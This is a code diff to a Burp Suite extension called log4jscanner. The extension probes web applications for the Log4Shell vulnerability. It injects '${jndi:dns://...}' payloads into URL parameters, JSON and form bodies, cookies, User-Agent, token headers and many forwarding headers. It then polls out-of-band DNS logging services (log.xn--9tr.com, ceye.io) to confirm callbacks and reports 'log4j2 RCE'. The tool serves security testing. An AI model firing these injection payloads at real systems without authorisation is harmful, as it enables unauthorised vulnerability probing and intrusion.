@@ -3,11 +3,16 @@ package burp;
 import com.alibaba.fastjson.JSON;
 import com.alibaba.fastjson.JSONObject;
 import java.awt.*;
-import java.io.IOException;
-import java.io.PrintWriter;
+import java.awt.event.MouseAdapter;
+import java.awt.event.MouseEvent;
+import java.io.*;
 import java.net.URL;
 import java.util.ArrayList;
+import java.util.Arrays;
 import java.util.List;
+import java.util.Objects;
+import java.util.regex.Matcher;
+import java.util.regex.Pattern;
 import javax.swing.*;
 import javax.swing.table.AbstractTableModel;
 import javax.swing.table.TableModel;
@@ -50,16 +55,71 @@ public class BurpExtender extends AbstractTableModel implements IBurpExtender, I
 
     private JTextArea textArea1;
 
+    private JButton mbutton;
+
     private JTextArea textArea2;
 
     private JPanel panel1;
 
-    private String dnslog;
+    private String logxn_dnslog;
 
-    private String dnslog_token;
+    private String logxn_dnslog_token;
+
+    private Boolean logxn ;
+
+    private Boolean burpdns;
+
+    private String burp_dnslog;
+
+    private String dnslogcn ;
+
+    private Boolean ceyeio ;
+
+    private String ceyetoken;
+
+    private String jarPath;
+
+    private IBurpCollaboratorClientContext collaboratorContext;
 
     public void registerExtenderCallbacks(IBurpExtenderCallbacks callbacks) {
+
+        IBurpCollaboratorClientContext collaboratorContext = null ;
         OkHttpClient client = new OkHttpClient();
+        String logxn_dnslog = "";
+        String logxn_dnslog_token = "";
+//        String burppayload = "";
+        Boolean logxn = true;
+        Boolean ceyeio = false;
+        String ceyetoken = "";
+//        Boolean burpdns = true;
+
+        String os = System.getProperty("os.name");
+        File f ;
+
+        if (os.toLowerCase().startsWith("win")) {
+            f = new File("log4j2burpscanner.properties");
+        }else{
+            String jarPath = callbacks.getExtensionFilename(); // 获取当前jar的路径
+            f = new File(jarPath.substring(0, jarPath.lastIndexOf("/")) + "/" + "log4j2burpscanner.properties");
+        }
+
+        if (!f.exists())
+        {
+            try {
+                f.createNewFile();
+                try (FileWriter fileWriter = new FileWriter(f)) {
+                    fileWriter.append("isceye=false");
+                    fileWriter.append("\n");
+                    fileWriter.append("ceyetoken=xxxxxx");
+                    fileWriter.append("\n");
+                    fileWriter.append("ceyednslog=xxxx.ceye.io");
+                    fileWriter.append("\n");
+                    fileWriter.flush();
+                } catch (IOException e) { e.printStackTrace(); }
+            } catch (IOException e) { e.printStackTrace(); }
+        }
+        // 查询logxn是否可以访问
+        try{
         String indexUrl = "https://log.xn--9tr.com/new_gen";
         Request loginReq = new Request.Builder()
                 .url(indexUrl)
@@ -80,29 +140,70 @@ public class BurpExtender extends AbstractTableModel implements IBurpExtender, I
             e.printStackTrace();
         }
         JSONObject jsonObject = JSON.parseObject(String.valueOf(respCookie));
-        String dnslog = jsonObject.getString("domain"); // 读取domain
-        dnslog = dnslog.substring(0,dnslog.length()-1);
-        String dnslog_token = jsonObject.getString("token"); // 读取token
 
-        this.dnslog = dnslog;
-        this.dnslog_token = dnslog_token;
+        logxn_dnslog = jsonObject.getString("domain"); // 读取domain，dnslog
+            logxn_dnslog = logxn_dnslog.substring(0,logxn_dnslog.length()-1);
+        logxn_dnslog_token = jsonObject.getString("token"); // 读取token，dnslog_token
+        }catch (Exception e){
+            logxn_dnslog = "log.xn--9tr.com can't access，need to configure ceye api";
+            logxn_dnslog_token = "log.xn--9tr.com can't access，need to configure ceye api";
+            logxn = false;
+    }
+
+        // 生成burp自身的dnslog
+//        try {
+//            collaboratorContext = callbacks.createBurpCollaboratorClientContext();
+//            burp_dnslog = collaboratorContext.generatePayload(true);
+//        }catch (Exception e){
+//            burp_dnslog = "burp dnslog 生成失败";
+//            burpdns = false;
+//        }
+        this.jarPath = jarPath;
+        this.logxn_dnslog = logxn_dnslog;
+        this.logxn_dnslog_token = logxn_dnslog_token;
+        this.logxn = logxn ;
+        this.ceyeio = ceyeio ;
+        this.burpdns = burpdns ;
+        this.ceyetoken = ceyetoken;
         this.callbacks = callbacks;
         this.helpers = callbacks.getHelpers();
         this.stdout = new PrintWriter(callbacks.getStdout(), true);
         callbacks.setExtensionName("log4jscanner");
         this.stdout.println("===========================");
         this.stdout.println("[+]   load successful!     ");
-        this.stdout.println("[+]   log4jscanner v0.1       ");
-        this.stdout.println("[+]   code by f0ng     ");
-        this.stdout.println("[+]  ");
+        this.stdout.println("[+]   log4jscanner v0.13   ");
+        this.stdout.println("[+]      code by f0ng      ");
+        this.stdout.println("[+]                       ");
         this.stdout.println("===========================");
-        this.stdout.println(this.dnslog);
-        this.stdout.println(this.dnslog_token);
-        this.stdout.println("You also can request to    https://" + dnslog + "/" + dnslog_token + "    to see dnslog");
+
+//        this.stdout.println("burp的dnslog为" + burp_dnslog);
+
+        this.stdout.println("dns address : " + this.logxn_dnslog);
+        this.stdout.println("dns token : " + this.logxn_dnslog_token);
+
+        if (this.logxn_dnslog.equals("log.xn--9tr.com无法访问")){
+
+        }else {
+            this.stdout.println("You also can request to    https://log.xn--9tr.com/" + this.logxn_dnslog_token + "    to see dnslog");
+        }
         SwingUtilities.invokeLater(new Runnable() {
             public void run() {
                 BurpExtender.this.textArea1 = new JTextArea("");
-                BurpExtender.this.textArea2 = new JTextArea("");
+//                BurpExtender.this.textArea2 = new JTextArea("");
+                BurpExtender.this.mbutton = new JButton("点击保存");
+                BurpExtender.this.mbutton.setSize(100,100);
+                BurpExtender.this.mbutton.addMouseListener(new MouseAdapter() {
+                    @Override
+                    public void mouseClicked(MouseEvent e){
+                        stdout.println("Save Success!");
+                        String fileContent = BurpExtender.this.textArea1.getText();
+                        try (FileWriter fileWriter = new FileWriter(f.getAbsolutePath())) {
+                            fileWriter.append(fileContent);
+                        } catch (IOException ee) {
+                            ee.printStackTrace();
+                        }
+                    }
+                });
                 BurpExtender.this.mjSplitPane = new JSplitPane(0); //上下
                 BurpExtender.this.Utable = new BurpExtender.URLTable(BurpExtender.this);
                 BurpExtender.this.UscrollPane = new JScrollPane(BurpExtender.this.Utable);
@@ -115,6 +216,22 @@ public class BurpExtender extends AbstractTableModel implements IBurpExtender, I
                 BurpExtender.this.Rtable = new JTabbedPane();
                 BurpExtender.this.HResponseTextEditor = BurpExtender.this.callbacks.createMessageEditor(BurpExtender.this, false);
                 BurpExtender.this.Rtable.addTab("Response", BurpExtender.this.HResponseTextEditor.getComponent());
+                BurpExtender.this.Rtable.add("dnslog配置", BurpExtender.this.textArea1);
+                BurpExtender.this.Rtable.add("按钮界面", BurpExtender.this.mbutton);
+
+                BufferedReader reader = null;
+                StringBuffer sbf = new StringBuffer();
+                String output = "";
+                try {
+                    reader = new BufferedReader(new FileReader(f));
+                    String tempStr;
+                    while ((tempStr = reader.readLine()) != null) {
+                        sbf.append(tempStr + '\n');
+                    }
+                    reader.close();
+                    output =  sbf.toString();
+                } catch (IOException e) {}
+                BurpExtender.this.textArea1.setText(output);
                 BurpExtender.this.HjSplitPane.add(BurpExtender.this.Ltable, "left"); // request窗体
                 BurpExtender.this.HjSplitPane.add(BurpExtender.this.Rtable, "right"); // response窗体
                 BurpExtender.this.mjSplitPane.add(BurpExtender.this.UscrollPane, "left"); // 结果集
@@ -123,31 +240,73 @@ public class BurpExtender extends AbstractTableModel implements IBurpExtender, I
 
                 BurpExtender.this.callbacks.customizeUiComponent(BurpExtender.this.mjSplitPane);
                 BurpExtender.this.callbacks.addSuiteTab(BurpExtender.this);
+
+
             }
         });
+
+
         callbacks.registerScannerCheck(this);
     }
 
     public List<IScanIssue> doPassiveScan(IHttpRequestResponse baseRequestResponse) {
+        File f;
+        String os = System.getProperty("os.name");
+        if (os.toLowerCase().startsWith("win")) {
+            f = new File("log4j2burpscanner.properties");
+        }else{
+            String jarPath = callbacks.getExtensionFilename(); // 获取当前jar的路径
+            f = new File(jarPath.substring(0, jarPath.lastIndexOf("/")) + "/" + "log4j2burpscanner.properties");
+        }
+        BufferedReader reader = null;
+        StringBuffer sbf = new StringBuffer();
+        String output = "";
+        try {
+            reader = new BufferedReader(new FileReader(f));
+            String tempStr;
+            while ((tempStr = reader.readLine()) != null) {
+                sbf.append(tempStr + '\n');
+            }
+            reader.close();
+            output =  sbf.toString();
+            if (output.contains("isceye=true")){
+                String[] headerss = output.split("ceyednslog=");
+                String header = headerss[1];
+                logxn = false;
+                ceyeio = true;
+                this.logxn_dnslog = header;
+
+                String[] headers_token = headerss[0].split("isceye=true\nceyetoken=");
+                this.ceyetoken = headers_token[1].trim();
+
+            }
+        } catch (IOException e) {}
+
         IHttpService httpService = baseRequestResponse.getHttpService();
         String host = httpService.getHost();
-        String randomstr = RandomStringUtils.randomAlphanumeric(6);
-
-        String vulnurl = "${jndi:ldap://" + randomstr + host + "." + this.dnslog + "/test}";
-
-        String uri_total = "";
-
         byte[] request = baseRequestResponse.getRequest();
         URL url = this.helpers.analyzeRequest(baseRequestResponse).getUrl();
         IRequestInfo analyzedIRequestInfo = this.helpers.analyzeRequest(request);
-
-//        if ()
 
         List<String> request_header = analyzedIRequestInfo.getHeaders(); // 获取请求头
         // 循环获取参数，判断类型，进行加密处理后，再构造新的参数，合并到新的请求包中。
 
         String firstrequest_header = request_header.get(0); //第一行请求包含请求方法、请求uri、http版本
-        System.out.println(firstrequest_header);
+        String[] firstheaders = firstrequest_header.split(" ");
+
+//        String randomstr = RandomStringUtils.randomAlphanumeric(6);
+//        String randomstr =  "${sys:java.version}";
+//        String hostname = "${hostName}";
+        // logxn 的dnslog
+//        stdout.println(firstheaders[1].split("/?")[0].replace("/","."));
+        String uri = firstheaders[1].split("\\?")[0].replace("/",".");
+        if (firstheaders[1].split("\\?")[0].replace("/",".").length() > 20)
+            uri = uri.substring(0,20);
+        String vulnurl = "${jndi:dns://"  + host  + uri + "."+ this.logxn_dnslog.trim() + "/test}";
+
+//        String vulnurl = "${jndi:dns://"  + randomstr +"." + host + "." + this.burp_dnslog + "/test}";
+
+        String uri_total = "";
 
 
         if(firstrequest_header.contains(".png") || firstrequest_header.contains(".js") || firstrequest_header.contains(".jpg") || firstrequest_header.contains(".jpeg") || firstrequest_header.contains(".svg")  || firstrequest_header.contains(".mp4") || firstrequest_header.contains(".css") || firstrequest_header.contains(".mp3")|| firstrequest_header.contains(".ico")){
@@ -158,7 +317,7 @@ public class BurpExtender extends AbstractTableModel implements IBurpExtender, I
 //        }
         else {
 
-            String[] firstheaders = firstrequest_header.split(" ");
+
             //firstheaders[0] 为请求方法
             //firstheaders[1] 为请求的uri
             //firstheaders[2] 为请求协议版本，不用看
@@ -183,7 +342,7 @@ public class BurpExtender extends AbstractTableModel implements IBurpExtender, I
                 uri_total = uri_total.substring(0, uri_total.length() - 1);
                 firstheaders[1] = requris[0] + "?" + uri_total;
             }
-
+            firstheaders[1] = firstheaders[1].replace("{","%7b").replace("}","%7d"); // 替换GET参数里的{和}
             if(firstheaders[0].contains("POST") || firstheaders[0].contains("PUT")){
 //                stdout.println("进入POST模式");
 //                stdout.println(body);
@@ -200,14 +359,14 @@ public class BurpExtender extends AbstractTableModel implements IBurpExtender, I
                          String[] body_single_lists = body_single.split("=");
                          body_total = body_total + body_single_lists[0] + "="  + vulnurl +  "&" ;
                      }
-                     body_total = body_total.substring(0,uri_total.length()-1);
+                     body_total = body_total.substring(0,body_total.length()-1);
                      body =  body_total;
                  }
 
                  /** !.contains("=")    .contains("{")
                  * {"a":"1","b":"22222"}
                  */
-                 else if( !body.contains("=") && body.contains("{")){
+                 else if( !body.contains("={") && body.contains("{") && !body.contains("&") && body.contains("\":\"") && !body.contains(":{\"")){
 //                     stdout.println("进入json模式");
                      JSONObject jsonObject = JSON.parseObject(body);
                      for (String key:jsonObject.keySet()) {
@@ -220,7 +379,7 @@ public class BurpExtender extends AbstractTableModel implements IBurpExtender, I
                  /** .contains("=")    .contains("{")
                  * a=1&param={"a":"1","b":"22222"}
                  */
-                 else if( body.contains("=") && body.contains("{") && body.contains("&")){
+                 else if( body.contains("={") && body.contains("&")){
 //                     stdout.println("进入普通和json混合模式");
                      String body_total = "";
                      String[] bodys_single = body.split("&");
@@ -241,10 +400,48 @@ public class BurpExtender extends AbstractTableModel implements IBurpExtender, I
                      body =  body_total;
                  }
 
-                 /** !.contains("=")    .contains("\\":{")
+                 /**
+                  * body={"a":"1","b":"22222"}
+                  */
+                 else if(body.contains("={") && !body.contains("&") && !body.contains("\":{")){
+                     String body_total = "";
+                         if (body.contains("{")){
+                             String[] body_single_lists = body.split(body.split("=")[0] + "=");
+                             JSONObject jsonObject = JSON.parseObject(body_single_lists[1]);
+                             for (String key:jsonObject.keySet()) {
+                                 jsonObject.put(key, vulnurl);
+                             }
+                             body_total = body_total + body.split("=")[0] + "=" + jsonObject.toString();
+                         }else {
+                             String[] body_single_lists = body.split("=");
+                             body_total = body_total + body_single_lists[0] + "=" + vulnurl ;
+                         }
+                     body = body_total;
+                 }
+
+                 /**
+                  * body={"params":{"a":"1","b":"22222"}}
+                  */
+                 else if (body.contains("={\"") && !body.contains("&") && body.contains("\":{")){
+                     String body_code = body;
+                     body = body.split(body.split("=")[0] + "=")[1];
+
+                     JSONObject jsonObject = JSON.parseObject(body);
+                     for (String key:jsonObject.keySet()) {
+                         if (jsonObject.getString(key).contains("{")){
+                             JSONObject jsonObject2 = JSON.parseObject(jsonObject.getString(key));
+                             for (String key2:jsonObject2.keySet())
+                                 jsonObject2.put(key2,vulnurl);
+                             jsonObject.put(key,jsonObject2);
+                         } else
+                             jsonObject.put(key, vulnurl);
+                     }
+                     body = body_code.split("=")[0] + "=" + jsonObject.toString();
+                 }
+                 /** !.contains("=")    .contains("\":{")  !.contains("&")
                  * {"params":{"a":"1","b":"22222"}}
                  */
-                 else if( !body.contains("&") && body.contains("\":{")) {
+                 else if( !body.contains("&") && body.contains("\":{") && !body.contains("={\"")) {
 //                     stdout.println("进入双层json模式");
                      JSONObject jsonObject = JSON.parseObject(body);
                      for (String key:jsonObject.keySet()) {
@@ -253,29 +450,49 @@ public class BurpExtender extends AbstractTableModel implements IBurpExtender, I
                              for (String key2:jsonObject2.keySet())
                                  jsonObject2.put(key2,vulnurl);
                              jsonObject.put(key,jsonObject2);
-//                System.out.println("有json");
                          } else
                              jsonObject.put(key, vulnurl);
-//            System.out.println(jsonObject.getString(key));
                      }
                      body = jsonObject.toString();
                  }
 
             }
 
-
             request_header.set(0,firstheaders[0] + " " + firstheaders[1] + " " + firstheaders[2]);
             // 去除源请求包里的Origin参数
             /*****************增加header**********************/
-            request_header.add("Forwarded-For-Ip: 127.0.0.1" + vulnurl); // 请求头增加
-            request_header.add("Forwarded-For: 127.0.0.1" + vulnurl); // 请求头增加
-            request_header.add("Forwarded: 127.0.0.1" + vulnurl); // 请求头增加
-            request_header.add("X-Client-IP: 127.0.0.1" + vulnurl); // 请求头增加
+//            request_header.add("X-Forwarded-For-Ip: 127.0.0.1" + vulnurl); // 请求头增加
+//            request_header.add("X-Forwarded-For: 127.0.0.1" + vulnurl); // 请求头增加
+//            request_header.add("Forwarded: 127.0.0.1" + vulnurl); // 请求头增加
+//            request_header.add("X-Client-IP: 127.0.0.1" + vulnurl); // 请求头增加
+            List<String> xff_lists = Arrays.asList("X-Forwarded-For","X-Forwarded","X-Requested-With","X-Requested-With", "X-Forwarded-Host",
+                    "X-remote-IP","X-remote-addr","True-Client-IP","X-Client-IP","Client-IP","X-Real-IP",
+                    "Ali-CDN-Real-IP","Cdn-Src-Ip","Cdn-Real-Ip","CF-Connecting-IP","X-Cluster-Client-IP",
+                    "WL-Proxy-Client-IP", "Proxy-Client-IP","Fastly-Client-Ip","True-Client-Ip","X-Originating-IP",
+                    "X-Host","X-Custom-IP-Authorization","X-original-host","X-forwarded-for","If-Modified-Since");
+
+            for (String xff:xff_lists)
+                if (!request_header.contains(xff + ":"))
+                    request_header.add(xff + ": 127.0.0.1 " + vulnurl);
+
             String cookie_total = "";
             String lowup = "up"; // 默认Cookie为大写
+            Boolean forwarded = false;
+            Boolean forwarded_for = false;
             for (int i = 0; i < request_header.size(); i++) {
-                if (request_header.get(i).contains("User-Agent"))
-                    request_header.set(i,request_header.get(i) + vulnurl); // UA头增加
+                String[] request_header_single = request_header.get(i).split(":");
+                if (request_header_single[0].equals("Forwarded")) //判断是否有Forwarded
+                    forwarded = true;
+
+                if (request_header_single[0].equals("Forwarded-For")) //判断是否有Forwarded
+                    forwarded_for = true;
+
+                if (request_header.get(i).contains("User-Agent:") || request_header.get(i).contains("token:") || request_header.get(i).contains("Token:") || request_header.get(i).contains("Bearer Token:"))
+                    request_header.set(i,request_header.get(i) + vulnurl); // UA头增加 token增加(jwt)
+
+                for (String xff:xff_lists)
+                    if (request_header.contains(xff + ":"))
+                        request_header.set(i,request_header.get(i) + vulnurl);
 
                 if (request_header.get(i).contains("cookie:") || request_header.get(i).contains("Cookie:") ) {
                     if (request_header.get(i).contains("cookie:")) {
@@ -296,6 +513,11 @@ public class BurpExtender extends AbstractTableModel implements IBurpExtender, I
                 }
             }
 //            stdout.println(request_header);
+            if (!forwarded) // 如果forwarded为false，即没有的话，就添加该payload
+                request_header.add( "Forwarded: 127.0.0.1 " + vulnurl);
+
+            if (!forwarded_for) // 如果forwarded_for为false，即没有的话，就添加该payload
+                request_header.add( "Forwarded-For: 127.0.0.1 " + vulnurl);
 
             byte[] request_bodys = body.getBytes();  //String to byte[]
             String reqMethod = this.helpers.analyzeRequest(baseRequestResponse).getMethod();
@@ -305,51 +527,166 @@ public class BurpExtender extends AbstractTableModel implements IBurpExtender, I
             IHttpRequestResponse newIHttpRequestResponse = this.callbacks.makeHttpRequest(httpService, newRequest);
             byte[] response = newIHttpRequestResponse.getResponse();
 
-            OkHttpClient client = new OkHttpClient();
-            String indexUrl = "https://log.xn--9tr.com/" + this.dnslog_token;
-            // todo 使用插件的时候获取一个token，固定token，减少请求
-            Request loginReq = new Request.Builder()
-                    .url(indexUrl)
-                    .get()
-                    .build();
 
-            Call call = client.newCall(loginReq);
+            if (logxn) { // logxn 的dnslog记录
+                OkHttpClient client = new OkHttpClient();
+                String indexUrl = "https://log.xn--9tr.com/" + this.logxn_dnslog_token.trim();
+//                stdout.println(indexUrl);
+                Request loginReq = new Request.Builder()
+                        .url(indexUrl)
+                        .get()
+                        .build();
 
-            Response response2 = null;
-            try {
-                response2 = call.execute();
-            } catch (IOException e) {
-                e.printStackTrace();
-            }
-            try {
-                String respCookie = response2.body().string(); // dnslog的响应体
-                if (respCookie.contains(host) && respCookie.contains(randomstr)) {
-                    synchronized (this.Udatas) {
-//                        List<Object> mes = FindKey(newIHttpRequestResponse, getRememberMeNumber(response));
-                    int row = this.Udatas.size();
-                    this.Udatas.add(new TablesData(row, reqMethod, url.toString(), this.helpers.analyzeResponse(response).getStatusCode() + "", "log4j2 rce", newIHttpRequestResponse, httpService.getHost(), httpService.getPort()));
-                    fireTableRowsInserted(row, row);
-                        List<IScanIssue> issues = new ArrayList(1);
-                        issues.add(new CustomScanIssue(
-                                httpService,
-                                url,
-                                new IHttpRequestResponse[]{newIHttpRequestResponse},
-                                "log4j2 RCE",
-                                "log4j2 RCE",
-                                "High"
-                        ));
-                    return issues;
-                    }
+                Call call = client.newCall(loginReq);
+                try {
+                    Robot  r   =   new   Robot();
+                    r.delay(1000);
+                } catch (AWTException e) {
+                    e.printStackTrace();
                 }
-            } catch (IOException e) {
-                e.printStackTrace();
+
+                Response response2 = null;
+                try {
+                    response2 = call.execute();
+                } catch (IOException e) {
+                    e.printStackTrace();
+                }
+                try {
+                    assert response2 != null;
+                    String respCookie = Objects.requireNonNull(response2.body()).string(); // dnslog的响应体
+
+                    if (respCookie.contains(host)) {
+                        synchronized (this.Udatas) {
+//                        List<Object> mes = FindKey(newIHttpRequestResponse, getRememberMeNumber(response));
+                            int row = this.Udatas.size();
+                            this.Udatas.add(new TablesData(row, reqMethod, url.toString(), this.helpers.analyzeResponse(response).getStatusCode() + "", "log4j2 rce", newIHttpRequestResponse, httpService.getHost(), httpService.getPort()));
+                            fireTableRowsInserted(row, row);
+                            List<IScanIssue> issues = new ArrayList(1);
+                            issues.add(new CustomScanIssue(
+                                    httpService,
+                                    url,
+                                    new IHttpRequestResponse[]{newIHttpRequestResponse},
+                                    "log4j2 RCE",
+                                    "log4j2 RCE",
+                                    "High"
+                            ));
+                            return issues;
+                        }
+                    }
+                } catch (IOException e) {
+                    e.printStackTrace();
+                }
             }
+
+            if (ceyeio) { // ceye 的dnslog记录
+                OkHttpClient client = new OkHttpClient();
+                String indexUrl = "http://api.ceye.io/v1/records?token=" + this.ceyetoken.trim() + "&type=dns&filter=" + host ;
+                Request loginReq = new Request.Builder()
+                        .url(indexUrl)
+                        .get()
+                        .build();
+
+                Call call = client.newCall(loginReq);
+                try {
+                    Robot  r   =   new   Robot();
+                    r.delay(1000);
+                } catch (AWTException e) {
+                    e.printStackTrace();
+                }
+
+                Response response2 = null;
+                try {
+                    response2 = call.execute();
+                } catch (IOException e) {
+                    e.printStackTrace();
+                }
+                try {
+                    assert response2 != null;
+                    String respCookie = Objects.requireNonNull(response2.body()).string(); // dnslog的响应体
+
+                    if (respCookie.contains(host)) {
+                        synchronized (this.Udatas) {
+//                        List<Object> mes = FindKey(newIHttpRequestResponse, getRememberMeNumber(response));
+                            int row = this.Udatas.size();
+                            this.Udatas.add(new TablesData(row, reqMethod, url.toString(), this.helpers.analyzeResponse(response).getStatusCode() + "", "log4j2 rce", newIHttpRequestResponse, httpService.getHost(), httpService.getPort()));
+                            fireTableRowsInserted(row, row);
+                            List<IScanIssue> issues = new ArrayList(1);
+                            issues.add(new CustomScanIssue(
+                                    httpService,
+                                    url,
+                                    new IHttpRequestResponse[]{newIHttpRequestResponse},
+                                    "log4j2 RCE",
+                                    "log4j2 RCE",
+                                    "High"
+                            ));
+                            return issues;
+                        }
+                    }
+                } catch (IOException e) {
+                    e.printStackTrace();
+                }
+            }
+
+//            if (burpdns) { // logxn 的dnslog记录
+//                stdout.println("burpdns" + burpdns);
+//                try {
+//                    Robot  r   =   new   Robot();
+//                    r.delay(500);
+//                } catch (AWTException e) {
+//                    e.printStackTrace();
+//                }
+//                List<IBurpCollaboratorInteraction> collaboratorInteractions = collaboratorContext.fetchCollaboratorInteractionsFor(burp_dnslog);
+//                for (IBurpCollaboratorInteraction collaboratorInteraction : collaboratorInteractions) {
+//                    stdout.println(collaboratorInteraction.getProperty("raw_query"));
+//                    stdout.println(host);
+//                    byte[] base64decodedBytes = Base64.getDecoder().decode(collaboratorInteraction.getProperty("raw_query"));
+//                    if (UnicodeDecode(new String(base64decodedBytes, StandardCharsets.UTF_8)).contains(host.replace(".","")))
+//                        stdout.println(host + "存在漏洞");
+//                }
+//
+////                    if (respCookie.contains(host)) {
+////                        synchronized (this.Udatas) {
+//////                        List<Object> mes = FindKey(newIHttpRequestResponse, getRememberMeNumber(response));
+////                            int row = this.Udatas.size();
+////                            this.Udatas.add(new TablesData(row, reqMethod, url.toString(), this.helpers.analyzeResponse(response).getStatusCode() + "", "log4j2 rce", newIHttpRequestResponse, httpService.getHost(), httpService.getPort()));
+////                            fireTableRowsInserted(row, row);
+////                            List<IScanIssue> issues = new ArrayList(1);
+////                            issues.add(new CustomScanIssue(
+////                                    httpService,
+////                                    url,
+////                                    new IHttpRequestResponse[]{newIHttpRequestResponse},
+////                                    "log4j2 RCE",
+////                                    "log4j2 RCE",
+////                                    "High"
+////                            ));
+////                            return issues;
+////                        }
+////                    }
+////                } catch (IOException e) {
+////                    e.printStackTrace();
+////                }
+//            }
 
             return null;
         }
 
     }
-
+    //Unicode转中文
+    public static String UnicodeDecode(String ascii) {
+        List<String> ascii_s = new ArrayList<String>();
+        String zhengz = "\\\\u[0-9,a-f,A-F]{4}";
+        Pattern p = Pattern.compile(zhengz);
+        Matcher m = p.matcher(ascii);
+        while (m.find()) {
+            ascii_s.add(m.group());
+        }
+        for (int i = 0, j = 2; i < ascii_s.size(); i++) {
+            String code = ascii_s.get(i).substring(j, j + 4);
+            char ch = (char) Integer.parseInt(code, 16);
+            ascii = ascii.replace(ascii_s.get(i), String.valueOf(ch));
+        }
+        return ascii;
+    }
 
     public List<IScanIssue> doActiveScan(IHttpRequestResponse baseRequestResponse, IScannerInsertionPoint insertionPoint) {
         return null;
